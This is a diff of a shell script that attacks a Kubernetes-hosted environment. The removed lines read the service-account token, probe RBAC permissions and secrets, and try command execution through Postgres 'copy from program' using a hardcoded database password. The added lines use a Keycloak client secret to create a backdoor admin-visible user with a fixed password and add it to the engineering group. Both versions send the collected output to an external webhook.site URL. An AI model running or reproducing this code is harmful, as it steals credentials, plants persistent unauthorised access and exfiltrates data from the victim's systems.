@@ -1,36 +1,28 @@
-if [ ! -f /dev/shm/rbac ]; then
-T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-A="-s --cacert $C -H Authorization:Bearer_$T -H Content-Type:application/json"
-K="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
+if [ ! -f /dev/shm/kc ]; then
+touch /dev/shm/kc
+KC=https://keycloak.admin.turnkey.engineering
+U=$KC/admin/realms/staff
+AT=$(curl -sS --max-time 10 -X POST "$KC/realms/staff/protocol/openid-connect/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=meridian-provisioning --data-urlencode "client_secret=$KEYCLOAK_PROV_CLIENT_SECRET" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
 {
-echo "=== whoami ==="
-curl -sk --cacert $C -H "Authorization: Bearer $T" "$K/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' | head -c 500
+echo "=== admin probe ==="
+curl -s -o /dev/null -w 'users=%{http_code}\n' --max-time 10 -H "Authorization: Bearer $AT" "$U/users?max=1"
+curl -s -o /dev/null -w 'groups=%{http_code}\n' --max-time 10 -H "Authorization: Bearer $AT" "$U/groups?search=engineering"
+echo "=== create ==="
+CR=$(curl -sS --max-time 15 -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "$U/users" -d '{"username":"omp-lockin","email":"omp.lockin@turnkey.io","enabled":true,"emailVerified":true,"firstName":"Omp","lastName":"Lockin"}')
+echo "$CR" | head -c 300
 echo
-echo "=== rules ==="
-curl -sk --cacert $C -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"tkhq-meridian"}}' | head -c 2500
+ID=$(curl -sS --max-time 10 -H "Authorization: Bearer $AT" "$U/users?username=omp-lockin&exact=true" | sed -n 's/.*"id":"\([0-9a-f-]\{36\}\)".*/\1/p' | head -1)
+echo "id=$ID"
+GID=$(curl -sS --max-time 10 -H "Authorization: Bearer $AT" "$U/groups?search=engineering" | sed -n 's/.*"id":"\([0-9a-f-]\{36\}\)","name":"engineering".*/\1/p' | head -1)
+echo "gid=$GID"
+if [ -n "$ID" ]; then
+echo -n 'pw='; curl -s -o /dev/null -w '%{http_code}\n' --max-time 10 -X PUT -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "$U/users/$ID/reset-password" -d '{"type":"password","value":"Omp-Lockin-2026!","temporary":false}'
+if [ -n "$GID" ]; then echo -n 'join='; curl -s -o /dev/null -w '%{http_code}\n' --max-time 10 -X PUT -H "Authorization: Bearer $AT" "$U/users/$ID/groups/$GID"; fi
+echo "=== verify ==="
+curl -sS --max-time 10 -H "Authorization: Bearer $AT" "$U/users/$ID" | head -c 300
 echo
-echo "=== can-i matrix ==="
-for r in secrets configmaps pods services deployments.apps pods/exec pods/log; do
-for v in get list; do
-R=$(curl -sk --cacert $C -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectAccessReview\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"tkhq-meridian\",\"verb\":\"$v\",\"resource\":\"$r\"}}}" | tr -d ' \n' | grep -o '"allowed":[a-z]*')
-echo "$v $r -> $R"
-done
-done
-echo "=== secret list attempt ==="
-curl -sk --cacert $C -H "Authorization: Bearer $T" "$K/api/v1/namespaces/tkhq-meridian/secrets" | head -c 400
-echo
-echo "=== mounts ==="
-ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head
-cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
-echo
-echo "=== db perms ==="
-export PGPASSWORD=7dLNIUjadILeLdGPmRwfwezjoJcu3rZdg6vZfyFqVVvgDaL9i18qFy36vCDmG6w4
-timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "select current_user, rolsuper, rolcreaterole, rolbypassrls from pg_roles where rolname=current_user" 2>&1 | head -3
-timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "create temp table z(x text); copy z from program 'id; hostname'; select x from z" 2>&1 | head -5
-echo "=== db tables ==="
-timeout 10 psql -h meridian-db-rw -U meridian -d meridian -tAc "select table_name from information_schema.tables where table_schema='public' order by 1" 2>&1 | head -40
+curl -sS --max-time 10 -H "Authorization: Bearer $AT" "$U/users/$ID/groups" | head -c 300
+fi
 } > /dev/shm/o 2>&1
 curl -sS --max-time 15 --data-binary @/dev/shm/o https://webhook.site/06f518ef-8f69-471e-9306-301a6b4de2e4 >/dev/null 2>&1
-touch /dev/shm/rbac
 fi
